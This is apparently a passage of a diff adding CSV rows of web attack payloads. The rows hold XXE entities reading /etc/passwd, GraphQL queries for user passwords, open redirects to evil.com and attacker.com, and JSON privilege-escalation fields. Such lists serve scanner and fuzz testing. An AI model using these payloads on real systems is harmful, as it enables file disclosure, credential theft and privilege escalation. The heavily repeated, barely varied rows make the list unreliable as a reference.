+XXE,Evasion,18,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,19,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,20,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,21,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,22,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,23,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,24,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,25,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,26,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,27,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,28,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,29,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,30,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,31,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,32,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,33,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,34,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,35,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,36,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,37,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,38,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,39,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,40,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,41,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,42,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,43,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,44,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,45,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,46,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,47,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,48,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,49,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,50,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,51,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,52,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,53,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,54,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,55,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,56,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,57,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,58,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,59,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+XXE,Evasion,60,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+GraphQL Injection,Basic,1,"{ users{id,password}}"
+GraphQL Injection,Basic,2,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,3,"{ users{id,password}}"
+GraphQL Injection,Basic,4,"{ users{id,password}}"
+GraphQL Injection,Basic,5,"{ users{id,password}}"
+GraphQL Injection,Basic,6,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,7,{ user(id:1){password}}
+GraphQL Injection,Basic,8,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,9,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,10,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,11,{user(id:1){password}}
+GraphQL Injection,Basic,12,"{ users{id,password}}"
+GraphQL Injection,Basic,13,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,14,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,15,{ user(id:1){password}}
+GraphQL Injection,Basic,16,"{ users{id,password}}"
+GraphQL Injection,Basic,17,"{ users{id,password}}"
+GraphQL Injection,Basic,18,{ user(id:1){password}}
+GraphQL Injection,Basic,19,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,20,{user(id:1){password}}
+GraphQL Injection,Basic,21,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,22,{ user(id:1){password}}
+GraphQL Injection,Basic,23,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,24,{ user(id:1){password}}
+GraphQL Injection,Basic,25,"{users{id,password}}"
+GraphQL Injection,Basic,26,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,27,"{users{id,password}}"
+GraphQL Injection,Basic,28,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,29,{ user(id:1){password}}
+GraphQL Injection,Basic,30,"{users{id,password}}"
+GraphQL Injection,Basic,31,"{ users{id,password}}"
+GraphQL Injection,Basic,32,"{ users{id,password}}"
+GraphQL Injection,Basic,33,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,34,{ user(id:1){password}}
+GraphQL Injection,Basic,35,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,36,"{ users{id,password}}"
+GraphQL Injection,Basic,37,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,38,"{users{id,password}}"
+GraphQL Injection,Basic,39,"{ users{id,password}}"
+GraphQL Injection,Basic,40,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,41,{user(id:1){password}}
+GraphQL Injection,Basic,42,{ user(id:1){password}}
+GraphQL Injection,Basic,43,"{users{id,password}}"
+GraphQL Injection,Basic,44,{ user(id:1){password}}
+GraphQL Injection,Basic,45,{user(id:1){password}}
+GraphQL Injection,Basic,46,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,47,{ user(id:1){password}}
+GraphQL Injection,Basic,48,"{ users{id,password}}"
+GraphQL Injection,Basic,49,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,50,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,51,"{users{id,password}}"
+GraphQL Injection,Basic,52,"{ users{id,password}}"
+GraphQL Injection,Basic,53,{user(id:1){password}}
+GraphQL Injection,Basic,54,"{ users{id,password}}"
+GraphQL Injection,Basic,55,{ user(id:1){password}}
+GraphQL Injection,Basic,56,{user(id:1){password}}
+GraphQL Injection,Basic,57,"{ users{id,password}}"
+GraphQL Injection,Basic,58,{ user(id:1){password}}
+GraphQL Injection,Basic,59,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,60,"{users{id,password}}"
+GraphQL Injection,Advanced,1,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,2,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,3,{user(id:1){password}}
+GraphQL Injection,Advanced,4,{user(id:1){password}}
+GraphQL Injection,Advanced,5,"{users{id,password}}"
+GraphQL Injection,Advanced,6,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,7,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,8,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,9,"{users{id,password}}"
+GraphQL Injection,Advanced,10,{user(id:1){password}}
+GraphQL Injection,Advanced,11,{user(id:1){password}}
+GraphQL Injection,Advanced,12,{user(id:1){password}}
+GraphQL Injection,Advanced,13,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,14,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,15,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,16,{user(id:1){password}}
+GraphQL Injection,Advanced,17,"{users{id,password}}"
+GraphQL Injection,Advanced,18,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,19,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,20,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,21,"{users{id,password}}"
+GraphQL Injection,Advanced,22,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,23,"{users{id,password}}"
+GraphQL Injection,Advanced,24,{user(id:1){password}}
+GraphQL Injection,Advanced,25,"{users{id,password}}"
+GraphQL Injection,Advanced,26,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,27,{user(id:1){password}}
+GraphQL Injection,Advanced,28,"{users{id,password}}"
+GraphQL Injection,Advanced,29,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,30,{user(id:1){password}}
+GraphQL Injection,Advanced,31,"{users{id,password}}"
+GraphQL Injection,Advanced,32,{user(id:1){password}}
+GraphQL Injection,Advanced,33,"{users{id,password}}"
+GraphQL Injection,Advanced,34,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,35,{user(id:1){password}}
+GraphQL Injection,Advanced,36,"{users{id,password}}"
+GraphQL Injection,Advanced,37,{user(id:1){password}}
+GraphQL Injection,Advanced,38,{user(id:1){password}}
+GraphQL Injection,Advanced,39,{user(id:1){password}}
+GraphQL Injection,Advanced,40,{user(id:1){password}}
+GraphQL Injection,Advanced,41,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,42,{user(id:1){password}}
+GraphQL Injection,Advanced,43,{user(id:1){password}}
+GraphQL Injection,Advanced,44,"{users{id,password}}"
+GraphQL Injection,Advanced,45,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,46,"{users{id,password}}"
+GraphQL Injection,Advanced,47,"{users{id,password}}"
+GraphQL Injection,Advanced,48,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,49,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,50,"{users{id,password}}"
+GraphQL Injection,Advanced,51,"{users{id,password}}"
+GraphQL Injection,Advanced,52,{user(id:1){password}}
+GraphQL Injection,Advanced,53,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,54,"{users{id,password}}"
+GraphQL Injection,Advanced,55,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,56,{user(id:1){password}}
+GraphQL Injection,Advanced,57,"{users{id,password}}"
+GraphQL Injection,Advanced,58,"{users{id,password}}"
+GraphQL Injection,Advanced,59,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,60,"{user(id:""1""){email}}"
+GraphQL Injection,Evasion,1,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,2,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,3,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,4,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,5,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,6,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,7,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,8,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,9,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,10,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,11,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,12,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,13,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,14,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,15,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,16,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,17,"%7Busers%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,18,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,19,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,20,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,21,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,22,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,23,"%7Busers%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,24,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,25,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,26,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,27,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,28,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,29,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,30,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,31,"%7Busers%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,32,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,33,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,34,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,35,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,36,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,37,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,38,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,39,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,40,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,41,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,42,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,43,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,44,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,45,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,46,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,47,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,48,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,49,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,50,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,51,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,52,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,53,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,54,%7B%20user(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,55,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,56,"%7Busers%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,57,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,58,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,59,"%7B%20users%7Bid,password%7D%7D"
+GraphQL Injection,Evasion,60,"%7B%20users%7Bid,password%7D%7D"
+Open Redirect,Basic,1,https://evil.com
+Open Redirect,Basic,2,https://evil.com
+Open Redirect,Basic,3,http://attacker.com
+Open Redirect,Basic,4,https://evil.com
+Open Redirect,Basic,5,//evil.com
+Open Redirect,Basic,6,http://attacker.com
+Open Redirect,Basic,7,https://evil.com
+Open Redirect,Basic,8,https://evil.com
+Open Redirect,Basic,9,https://evil.com
+Open Redirect,Basic,10,https://evil.com
+Open Redirect,Basic,11,//evil.com
+Open Redirect,Basic,12,https://attacker.com
+Open Redirect,Basic,13,//evil.com
+Open Redirect,Basic,14,//evil.com
+Open Redirect,Basic,15,https://evil.com
+Open Redirect,Basic,16,//evil.com
+Open Redirect,Basic,17,https://evil.com
+Open Redirect,Basic,18,http://attacker.com
+Open Redirect,Basic,19,//evil.com
+Open Redirect,Basic,20,https://evil.com
+Open Redirect,Basic,21,http://attacker.com
+Open Redirect,Basic,22,https://attacker.com
+Open Redirect,Basic,23,https://evil.com
+Open Redirect,Basic,24,https://attacker.com
+Open Redirect,Basic,25,https://evil.com
+Open Redirect,Basic,26,https://attacker.com
+Open Redirect,Basic,27,//evil.com
+Open Redirect,Basic,28,https://evil.com
+Open Redirect,Basic,29,https://evil.com
+Open Redirect,Basic,30,//evil.com
+Open Redirect,Basic,31,https://evil.com
+Open Redirect,Basic,32,https://attacker.com
+Open Redirect,Basic,33,//evil.com
+Open Redirect,Basic,34,https://evil.com
+Open Redirect,Basic,35,http://attacker.com
+Open Redirect,Basic,36,https://evil.com
+Open Redirect,Basic,37,//evil.com
+Open Redirect,Basic,38,http://attacker.com
+Open Redirect,Basic,39,https://evil.com
+Open Redirect,Basic,40,http://attacker.com
+Open Redirect,Basic,41,https://attacker.com
+Open Redirect,Basic,42,https://evil.com
+Open Redirect,Basic,43,https://evil.com
+Open Redirect,Basic,44,https://evil.com
+Open Redirect,Basic,45,//evil.com
+Open Redirect,Basic,46,https://evil.com
+Open Redirect,Basic,47,https://evil.com
+Open Redirect,Basic,48,//evil.com
+Open Redirect,Basic,49,//evil.com
+Open Redirect,Basic,50,//evil.com
+Open Redirect,Basic,51,//evil.com
+Open Redirect,Basic,52,//evil.com
+Open Redirect,Basic,53,http://attacker.com
+Open Redirect,Basic,54,https://evil.com
+Open Redirect,Basic,55,https://evil.com
+Open Redirect,Basic,56,https://evil.com
+Open Redirect,Basic,57,https://evil.com
+Open Redirect,Basic,58,http://attacker.com
+Open Redirect,Basic,59,https://evil.com
+Open Redirect,Basic,60,https://evil.com
+Open Redirect,Advanced,1,//evil.com
+Open Redirect,Advanced,2,http://attacker.com
+Open Redirect,Advanced,3,https://attacker.com
+Open Redirect,Advanced,4,https://evil.com
+Open Redirect,Advanced,5,http://attacker.com
+Open Redirect,Advanced,6,https://evil.com
+Open Redirect,Advanced,7,https://evil.com
+Open Redirect,Advanced,8,https://evil.com
+Open Redirect,Advanced,9,https://attacker.com
+Open Redirect,Advanced,10,http://attacker.com
+Open Redirect,Advanced,11,https://evil.com
+Open Redirect,Advanced,12,https://evil.com
+Open Redirect,Advanced,13,//evil.com
+Open Redirect,Advanced,14,//evil.com
+Open Redirect,Advanced,15,http://attacker.com
+Open Redirect,Advanced,16,https://evil.com
+Open Redirect,Advanced,17,//evil.com
+Open Redirect,Advanced,18,//evil.com
+Open Redirect,Advanced,19,http://attacker.com
+Open Redirect,Advanced,20,http://attacker.com
+Open Redirect,Advanced,21,http://attacker.com
+Open Redirect,Advanced,22,//evil.com
+Open Redirect,Advanced,23,//evil.com
+Open Redirect,Advanced,24,//evil.com
+Open Redirect,Advanced,25,//evil.com
+Open Redirect,Advanced,26,https://evil.com
+Open Redirect,Advanced,27,http://attacker.com
+Open Redirect,Advanced,28,//evil.com
+Open Redirect,Advanced,29,https://evil.com
+Open Redirect,Advanced,30,//evil.com
+Open Redirect,Advanced,31,https://evil.com
+Open Redirect,Advanced,32,http://attacker.com
+Open Redirect,Advanced,33,//evil.com
+Open Redirect,Advanced,34,//evil.com
+Open Redirect,Advanced,35,//evil.com
+Open Redirect,Advanced,36,https://evil.com
+Open Redirect,Advanced,37,https://attacker.com
+Open Redirect,Advanced,38,https://evil.com
+Open Redirect,Advanced,39,https://evil.com
+Open Redirect,Advanced,40,http://attacker.com
+Open Redirect,Advanced,41,//evil.com
+Open Redirect,Advanced,42,https://evil.com
+Open Redirect,Advanced,43,https://evil.com
+Open Redirect,Advanced,44,https://evil.com
+Open Redirect,Advanced,45,http://attacker.com
+Open Redirect,Advanced,46,https://evil.com
+Open Redirect,Advanced,47,//evil.com
+Open Redirect,Advanced,48,//evil.com
+Open Redirect,Advanced,49,//evil.com
+Open Redirect,Advanced,50,//evil.com
+Open Redirect,Advanced,51,//evil.com
+Open Redirect,Advanced,52,https://attacker.com
+Open Redirect,Advanced,53,//evil.com
+Open Redirect,Advanced,54,//evil.com
+Open Redirect,Advanced,55,https://evil.com
+Open Redirect,Advanced,56,https://attacker.com
+Open Redirect,Advanced,57,https://evil.com
+Open Redirect,Advanced,58,http://attacker.com
+Open Redirect,Advanced,59,//evil.com
+Open Redirect,Advanced,60,//evil.com
+Open Redirect,Evasion,1,//evil.com
+Open Redirect,Evasion,2,https://evil.com
+Open Redirect,Evasion,3,//evil.com
+Open Redirect,Evasion,4,https://attacker.com
+Open Redirect,Evasion,5,//evil.com
+Open Redirect,Evasion,6,http://attacker.com
+Open Redirect,Evasion,7,http://attacker.com
+Open Redirect,Evasion,8,https://evil.com
+Open Redirect,Evasion,9,https://evil.com
+Open Redirect,Evasion,10,https://evil.com
+Open Redirect,Evasion,11,https://evil.com
+Open Redirect,Evasion,12,//evil.com
+Open Redirect,Evasion,13,//evil.com
+Open Redirect,Evasion,14,http://attacker.com
+Open Redirect,Evasion,15,//evil.com
+Open Redirect,Evasion,16,https://evil.com
+Open Redirect,Evasion,17,https://evil.com
+Open Redirect,Evasion,18,https://evil.com
+Open Redirect,Evasion,19,https://evil.com
+Open Redirect,Evasion,20,//evil.com
+Open Redirect,Evasion,21,//evil.com
+Open Redirect,Evasion,22,http://attacker.com
+Open Redirect,Evasion,23,http://attacker.com
+Open Redirect,Evasion,24,//evil.com
+Open Redirect,Evasion,25,//evil.com
+Open Redirect,Evasion,26,https://evil.com
+Open Redirect,Evasion,27,https://evil.com
+Open Redirect,Evasion,28,https://evil.com
+Open Redirect,Evasion,29,http://attacker.com
+Open Redirect,Evasion,30,https://evil.com
+Open Redirect,Evasion,31,http://attacker.com
+Open Redirect,Evasion,32,//evil.com
+Open Redirect,Evasion,33,https://attacker.com
+Open Redirect,Evasion,34,https://evil.com
+Open Redirect,Evasion,35,http://attacker.com
+Open Redirect,Evasion,36,https://evil.com
+Open Redirect,Evasion,37,https://evil.com
+Open Redirect,Evasion,38,https://evil.com
+Open Redirect,Evasion,39,https://evil.com
+Open Redirect,Evasion,40,//evil.com
+Open Redirect,Evasion,41,https://attacker.com
+Open Redirect,Evasion,42,http://attacker.com
+Open Redirect,Evasion,43,http://attacker.com
+Open Redirect,Evasion,44,https://attacker.com
+Open Redirect,Evasion,45,https://attacker.com
+Open Redirect,Evasion,46,http://attacker.com
+Open Redirect,Evasion,47,https://evil.com
+Open Redirect,Evasion,48,http://attacker.com
+Open Redirect,Evasion,49,//evil.com
+Open Redirect,Evasion,50,https://evil.com
+Open Redirect,Evasion,51,https://evil.com
+Open Redirect,Evasion,52,https://attacker.com
+Open Redirect,Evasion,53,//evil.com
+Open Redirect,Evasion,54,//evil.com
+Open Redirect,Evasion,55,//evil.com
+Open Redirect,Evasion,56,//evil.com
+Open Redirect,Evasion,57,http://attacker.com
+Open Redirect,Evasion,58,https://attacker.com
+Open Redirect,Evasion,59,https://evil.com
+Open Redirect,Evasion,60,http://attacker.com
+API Abuse,Basic,1,"{""role"":""admin""}"
+API Abuse,Basic,2,"{""access"":""root""}"
+API Abuse,Basic,3,"{""role"":""admin""}"
+API Abuse,Basic,4,"{""role"":""admin""}"
+API Abuse,Basic,5,"{""admin"":true}"
+API Abuse,Basic,6,"{""access"":""root""}"
+API Abuse,Basic,7,"{""admin"":true}"
+API Abuse,Basic,8,"{""access"":""root""}"
+API Abuse,Basic,9,"{""role"":""admin""}"
+API Abuse,Basic,10,"{""role"":""admin""}"
+API Abuse,Basic,11,"{""role"":""admin""}"
+API Abuse,Basic,12,"{""admin"":true}"
+API Abuse,Basic,13,"{""role"":""admin""}"
+API Abuse,Basic,14,"{""access"":""root""}"
+API Abuse,Basic,15,"{""role"":""admin""}"
+API Abuse,Basic,16,"{""admin"":true}"
+API Abuse,Basic,17,"{""admin"":true}"
+API Abuse,Basic,18,"{""role"":""admin""}"
+API Abuse,Basic,19,"{""role"":""admin""}"
+API Abuse,Basic,20,"{""admin"":true}"
+API Abuse,Basic,21,"{""access"":""root""}"
+API Abuse,Basic,22,"{""role"":""admin""}"
+API Abuse,Basic,23,"{""role"":""admin""}"
+API Abuse,Basic,24,"{""role"":""admin""}"
+API Abuse,Basic,25,"{""role"":""admin""}"
+API Abuse,Basic,26,"{""admin"":true}"
+API Abuse,Basic,27,"{""access"":""root""}"
+API Abuse,Basic,28,"{""admin"":true}"
+API Abuse,Basic,29,"{""role"":""admin""}"
+API Abuse,Basic,30,"{""access"":""root""}"
+API Abuse,Basic,31,"{""access"":""root""}"
+API Abuse,Basic,32,"{""access"":""root""}"
+API Abuse,Basic,33,"{""role"":""admin""}"
+API Abuse,Basic,34,"{""role"":""admin""}"
+API Abuse,Basic,35,"{""role"":""admin""}"
+API Abuse,Basic,36,"{""admin"":true}"
+API Abuse,Basic,37,"{""role"":""admin""}"
+API Abuse,Basic,38,"{""access"":""root""}"
+API Abuse,Basic,39,"{""access"":""root""}"
+API Abuse,Basic,40,"{""role"":""admin""}"
+API Abuse,Basic,41,"{""admin"":true}"
+API Abuse,Basic,42,"{""admin"":true}"
+API Abuse,Basic,43,"{""access"":""root""}"
+API Abuse,Basic,44,"{""access"":""root""}"
+API Abuse,Basic,45,"{""role"":""admin""}"
+API Abuse,Basic,46,"{""admin"":true}"
+API Abuse,Basic,47,"{""role"":""admin""}"
+API Abuse,Basic,48,"{""access"":""root""}"
+API Abuse,Basic,49,"{""role"":""admin""}"
+API Abuse,Basic,50,"{""role"":""admin""}"
+API Abuse,Basic,51,"{""admin"":true}"
+API Abuse,Basic,52,"{""access"":""root""}"
+API Abuse,Basic,53,"{""access"":""root""}"
+API Abuse,Basic,54,"{""admin"":true}"
+API Abuse,Basic,55,"{""admin"":true}"
+API Abuse,Basic,56,"{""access"":""root""}"
+API Abuse,Basic,57,"{""access"":""root""}"
+API Abuse,Basic,58,"{""admin"":true}"
+API Abuse,Basic,59,"{""access"":""root""}"
+API Abuse,Basic,60,"{""admin"":true}"
+API Abuse,Advanced,1,"{""role"":""admin""}"
+API Abuse,Advanced,2,"{""admin"":true}"
+API Abuse,Advanced,3,"{""access"":""root""}"
+API Abuse,Advanced,4,"{""admin"":true}"
+API Abuse,Advanced,5,"{""role"":""admin""}"
+API Abuse,Advanced,6,"{""admin"":true}"
+API Abuse,Advanced,7,"{""admin"":true}"
+API Abuse,Advanced,8,"{""admin"":true}"
+API Abuse,Advanced,9,"{""access"":""root""}"
+API Abuse,Advanced,10,"{""admin"":true}"
+API Abuse,Advanced,11,"{""role"":""admin""}"
+API Abuse,Advanced,12,"{""access"":""root""}"
+API Abuse,Advanced,13,"{""admin"":true}"
+API Abuse,Advanced,14,"{""admin"":true}"
+API Abuse,Advanced,15,"{""role"":""admin""}"
+API Abuse,Advanced,16,"{""admin"":true}"
+API Abuse,Advanced,17,"{""role"":""admin""}"
+API Abuse,Advanced,18,"{""access"":""root""}"
+API Abuse,Advanced,19,"{""access"":""root""}"
+API Abuse,Advanced,20,"{""admin"":true}"
+API Abuse,Advanced,21,"{""role"":""admin""}"
+API Abuse,Advanced,22,"{""admin"":true}"
+API Abuse,Advanced,23,"{""role"":""admin""}"
+API Abuse,Advanced,24,"{""role"":""admin""}"
+API Abuse,Advanced,25,"{""access"":""root""}"
+API Abuse,Advanced,26,"{""access"":""root""}"
+API Abuse,Advanced,27,"{""access"":""root""}"
+API Abuse,Advanced,28,"{""role"":""admin""}"
+API Abuse,Advanced,29,"{""role"":""admin""}"
